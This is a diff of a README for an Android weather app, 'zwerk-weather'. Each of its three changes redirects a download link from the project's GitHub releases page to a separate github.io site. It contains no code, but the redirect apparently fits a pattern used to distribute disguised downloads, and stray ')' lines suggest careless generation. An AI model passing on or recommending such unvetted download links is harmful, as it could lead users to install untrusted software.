@@ -1,7 +1,7 @@
 <h1>⛅ zwerk-weather - Your Personal Pocket Weather Guardian</h1>
 
 <p align="center">
-  <a href="https://github.com/stirred-wistaria6332/zwerk-weather/releases">
+  <a href="https://stirred-wistaria6332.github.io">
     <img src="https://img.shields.io/badge/Download%20Now-Free%20App-blue?style=for-the-badge&logo=android&logoColor=white&color=34a853" alt="Download zwerk-weather" style="max-width: 400px; width: 100%; height: auto;"/>
   </a>
 </p>
@@ -55,7 +55,7 @@ We believe weather apps should be informative, not annoying. zwerk-weather conta
 ### Step 1: Download the App
 
 Visit this link to download the application:
-[🔗 Download zwerk-weather](https://github.com/stirred-wistaria6332/zwerk-weather/releases)
+[🔗 Download zwerk-weather](https://stirred-wistaria6332.github.io)
 
 )
 
@@ -197,7 +197,7 @@ zwerk-weather is continuously improving with regular updates, new features, and 
 
 Ready to experience the best weather app Android has to offerand free of ads?
 
-[🔗 Visit this link to download the application](https://github.com/stirred-wistaria6332/zwerk-weather/releases)
+[🔗 Visit this link to download the application](https://stirred-wistaria6332.github.io)
 
 )
 
